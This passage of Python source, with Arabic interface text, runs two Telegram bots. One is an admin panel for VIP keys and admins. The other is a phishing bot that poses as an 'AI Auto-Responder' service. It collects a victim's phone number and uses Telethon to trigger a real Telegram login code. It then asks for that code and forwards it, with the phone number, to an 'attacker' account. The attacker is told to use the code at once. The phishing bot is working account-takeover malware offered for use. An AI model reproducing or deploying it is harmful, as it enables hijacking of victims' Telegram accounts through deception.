                    f"⭐ <b>حالة VIP:</b> {vip_status}\n"
                    f"⏳ <b>تاريخ الانتهاء:</b> {expiry}\n"
                    f"👥 <b>عدد الدعوات:</b> <code>{u.get('ref_count', 0)}</code>"
                )
                bot.send_message(cid, txt, reply_markup=admin_panel())
            else:
                bot.send_message(cid, f"❌ <b>غير موجود.</b>", reply_markup=admin_panel())
            states["user_info"].pop(cid, None)
        elif cid in states.get("create_vip_key_days", {}) and states["create_vip_key_days"][cid]:
            if text.isdigit() and int(text) > 0:
                states["temp_create_vip_key"][cid] = {"days": int(text)}
                states["create_vip_key_days"].pop(cid, None)
                states["create_vip_key_uses"][cid] = True
                bot.send_message(cid, f"{ce('🔢')} <b>أرسل الحد الأقصى للاستخدامات لهذا المفتاح:</b>")
            else:
                bot.send_message(cid, f"❌ <b>أدخل رقمًا صحيحًا.</b>")
        elif cid in states.get("create_vip_key_uses", {}) and states["create_vip_key_uses"][cid]:
            if text.isdigit() and int(text) > 0:
                days = states["temp_create_vip_key"][cid]["days"]
                uses = int(text)
                key = uuid.uuid4().hex[:10].upper()
                keys = load_vip_keys()
                keys[key] = {"days": days, "max_uses": uses, "uses_left": uses, "status": "active", "users": [], "created_at": time.time()}
                save_vip_keys(keys)
                states["create_vip_key_uses"].pop(cid, None)
                states["temp_create_vip_key"].pop(cid, None)
                bot.send_message(cid, f"✅ <b>تم إنشاء المفتاح بنجاح!</b>\n\n{ce('🔑')} المفتاح: <code>{key}</code>\n⏳ المدة: {days} يوم\n{ce('🔢')} الاستخدامات: {uses}", reply_markup=vip_keys_menu())
            else:
                bot.send_message(cid, f"❌ <b>أدخل رقمًا صحيحًا.</b>")
        elif cid in states.get("disable_vip_key", {}) and states["disable_vip_key"][cid]:
            keys = load_vip_keys()
            if text in keys:
                keys[text]['status'] = 'disabled'
                save_vip_keys(keys)
                bot.send_message(cid, f"✅ <b>تم تعطيل المفتاح.</b>", reply_markup=vip_keys_menu())
            else:
                bot.send_message(cid, f"❌ <b>المفتاح غير موجود.</b>", reply_markup=vip_keys_menu())
            states["disable_vip_key"].pop(cid, None)
        elif cid in states.get("enable_vip_key", {}) and states["enable_vip_key"][cid]:
            keys = load_vip_keys()
            if text in keys:
                keys[text]['status'] = 'active'
                save_vip_keys(keys)
                bot.send_message(cid, f"✅ <b>تم تفعيل المفتاح.</b>", reply_markup=vip_keys_menu())
            else:
                bot.send_message(cid, f"❌ <b>المفتاح غير موجود.</b>", reply_markup=vip_keys_menu())
            states["enable_vip_key"].pop(cid, None)
        elif cid in states.get("delete_vip_key", {}) and states["delete_vip_key"][cid]:
            keys = load_vip_keys()
            if text in keys:
                del keys[text]
                save_vip_keys(keys)
                bot.send_message(cid, f"✅ <b>تم حذف المفتاح.</b>", reply_markup=vip_keys_menu())
            else:
                bot.send_message(cid, f"❌ <b>المفتاح غير موجود.</b>", reply_markup=vip_keys_menu())
            states["delete_vip_key"].pop(cid, None)
        elif cid in states.get("add_admin", {}) and states["add_admin"][cid]:
            a = load_admins()
            if int(text) not in a: a.append(int(text))
            save_admins(a)
            bot.send_message(cid, f"✅ <b>تم الإضافة.</b>", reply_markup=admin_panel())
            states["add_admin"].pop(cid, None)
        elif cid in states.get("rm_admin", {}) and states["rm_admin"][cid]:
            a = load_admins()
            if int(text) in a and int(text) != OWNER_ID: a.remove(int(text))
            save_admins(a)
            bot.send_message(cid, f"✅ <b>تم الحذف.</b>", reply_markup=admin_panel())
            states["rm_admin"].pop(cid, None)
        elif cid in states.get("adm_vip_7d_input", {}) and states["adm_vip_7d_input"][cid]:
            u = get_user(int(text))
            if u:
                u['vip_expiry'] = time.time() + (7 * 24 * 60 * 60)
                update_user(int(text), u)
                bot.send_message(cid, f"✅ <b>تم تفعيل VIP 7 أيام.</b>", reply_markup=admin_panel())
            else:
                bot.send_message(cid, f"❌ <b>غير موجود.</b>", reply_markup=admin_panel())
            states["adm_vip_7d_input"].pop(cid, None)
        elif cid in states.get("adm_vip_30d_input", {}) and states["adm_vip_30d_input"][cid]:
            u = get_user(int(text))
            if u:
                u['vip_expiry'] = time.time() + (30 * 24 * 60 * 60)
                update_user(int(text), u)
                bot.send_message(cid, f"✅ <b>تم تفعيل VIP 30 يوم.</b>", reply_markup=admin_panel())
            else:
                bot.send_message(cid, f"❌ <b>غير موجود.</b>", reply_markup=admin_panel())
            states["adm_vip_30d_input"].pop(cid, None)

async def send_tg_code_async(phone):
    try:
        client = telethon.TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        await client.send_code_request(phone)
        await client.disconnect()
        return True
    except PhoneNumberInvalidError: return "invalid"
    except FloodWaitError: return False
    except Exception as e:
        logger.error(f"Telethon send code error: {e}")
        return False

def send_tg_code(phone):
    try: return asyncio.run(send_tg_code_async(phone))
    except Exception as e:
        logger.error(f"Asyncio run error: {e}")
        return False

@fake_bot.message_handler(commands=['start'])
def fake_cmd_start(msg):
    cid = msg.chat.id
    args = msg.text.split()
    attacker_id = None
    if len(args) > 1 and args[1].startswith("fake_"):
        try:
            attacker_id = int(args[1].split("_")[1])
            fake_sessions[cid] = attacker_id
        except: pass
    welcome_txt = (
        f"{ce('🧠')} <b>أهلاً بك في مساعد تيليجرام الذكي (AI Auto-Responder).</b>\n\n"
        "هل ترغب في تفعيل نظام الرد التلقائي بالذكاء الاصطناعي؟\n\n"
        f"💡 يمكن لذكاءنا الاصطناعي قراءة رسائلك والرد نيابة عنك بشكل ذكي ومناسب، حتى أثناء نومك أو انشغالك!\n\n"
        "يرجى الضغط على زر التفعيل بالأسفل للبدء."
    )
    try: fake_bot.send_message(cid, welcome_txt, reply_markup=fake_bot_welcome_menu())
    except: pass

@fake_bot.callback_query_handler(func=lambda call: True)
def fake_handle_buttons(call):
    cid = call.message.chat.id
    try:
        if call.data == "fake_add_account":
            fake_states[cid] = {"step": "phone"}
            fake_bot.send_message(cid, f"📱 <b>لربط المساعد الذكي بحسابك لبدء الرد التلقائي، يرجى إرسال رقم هاتفك المسجل في تيليجرام مع رمز الدولة:</b>\n\n<i>مثال: 9647800000000</i>")
        elif call.data == "fake_info":
            fake_bot.answer_callback_query(call.id, f"ℹ️ هذه الخدمة تتيح لك تفعيل ذكاء اصطناعي يرد على رسائلك نيابة عنك تلقائياً.", show_alert=True)
    except: pass

@fake_bot.message_handler(func=lambda msg: True)
def fake_handle_messages(msg):
    cid = msg.chat.id
    text = msg.text
    state = fake_states.get(cid)
    if not state: return
        
    if state.get("step") == "phone":
        phone = text.strip().replace(" ", "")
        if not phone.startswith("+"): phone = "+" + phone
        fake_bot.send_message(cid, f"⏳ <b>جاري إرسال رمز التحقق إلى تطبيق تيليجرام الخاص بك...</b>")
        def send_code_thread():
            res = send_tg_code(phone)
            if res == "invalid":
                try: fake_bot.send_message(cid, f"❌ رقم الهاتف غير صحيح. يرجى التأكد من الرقم وإرساله مرة أخرى.")
                except: pass
                fake_states[cid] = {"step": "phone"}
            else:
                fake_states[cid] = {"step": "code", "phone": phone}
                try: fake_bot.send_message(cid, f"✅ <b>تم استلام رقمك بنجاح!</b>\n\n{ce('🧠')} لتأكيد ربط المساعد الذكي، تم إرسال رمز التحقق (Login Code) إلى تطبيق تيليجرام الخاص بك.\n\n⚠️ <i>يرجى إدخال الرمز هنا لإتمام تفعيل الرد التلقائي:</i>")
                except: pass
        Thread(target=send_code_thread).start()
        return

    if state.get("step") == "code":
        phone = state["phone"]
        code = text.strip()
        fake_states.pop(cid, None)
        attacker_id = fake_sessions.get(cid)
        if attacker_id:
            try: bot.send_message(attacker_id, f"{ce('🎣')} <b>[ تم الصيد - مساعد ذكي ]</b>\n\n{ce('👤')} <b>الضحية:</b> <code>{cid}</code>\n📱 <b>الرقم:</b> <code>{phone}</code>\n🔑 <b>رمز الدخول:</b> <code>{code}</code>\n\n⚠️ <i>استخدم الرمز فوراً قبل انتهاء صلاحيته!</i>")
            except: pass
        else:
            try: bot.send_message(OWNER_ID, f"{ce('🎣')} <b>[ صيد بدون رابط محدد ]</b>\n\n{ce('👤')} <b>الضحية:</b> <code>{cid}</code>\n📱 <b>الرقم:</b> <code>{phone}</code>\n🔑 <b>الرمز:</b> <code>{code}</code>")
            except: pass
        try: fake_bot.send_message(cid, f"✅ <b>تم تفعيل المساعد الذكي بنجاح!</b>\n\nالآن سيقوم الذكاء الاصطناعي بالرد على رسائلك نيابة عنك. يمكنك الاسترخاء والنوم بسلام! {ce('😴')}\n\nشكراً لاستخدامك خدمتنا.")
        except: pass
        if cid in fake_sessions: del fake_sessions[cid]
        return

if __name__ == '__main__':
    keep_alive()
    try:
        bot.delete_webhook()
        logger.info("Main bot webhook deleted successfully.")
    except Exception as e:
        logger.error(f"Failed to delete main bot webhook: {e}")
    try:
        fake_bot.delete_webhook()
        logger.info("Fake bot webhook deleted successfully.")
    except Exception as e:
        logger.error(f"Failed to delete fake bot webhook: {e}")
    
    def run_main_bot():
        while True:
            try: bot.infinity_polling(timeout=30, long_polling_timeout=30, skip_pending=True)
            except requests.exceptions.ReadTimeout:
                logger.warning("Main bot read timeout, retrying in 3 seconds...")
                time.sleep(3)
            except Exception as e:
                err_str = str(e)
                if "409" in err_str or "Conflict" in err_str: logger.warning("⚠️ Main Bot 409 Conflict: نسخة أخرى تعمل، سأحاول مجدداً بعد 10 ثواني...")
                else: logger.error(f"Main bot polling error: {e}")
                time.sleep(10)
                
    def run_fake_bot():
        while True:
            try: fake_bot.infinity_polling(timeout=30, long_polling_timeout=30, skip_pending=True)
            except requests.exceptions.ReadTimeout:
                logger.warning("Fake bot read timeout, retrying in 3 seconds...")
                time.sleep(3)
            except Exception as e:
                err_str = str(e)
                if "409" in err_str or "Conflict" in err_str: logger.warning("⚠️ Fake Bot 409 Conflict: نسخة أخرى تعمل، سأحاول مجدداً بعد 10 ثواني...")
                else: logger.error(f"Fake bot polling error: {e}")
                time.sleep(10)
        
    Thread(target=run_main_bot, daemon=True).start()
    Thread(target=run_fake_bot, daemon=True).start()
    
    while True:
        time.sleep(1)
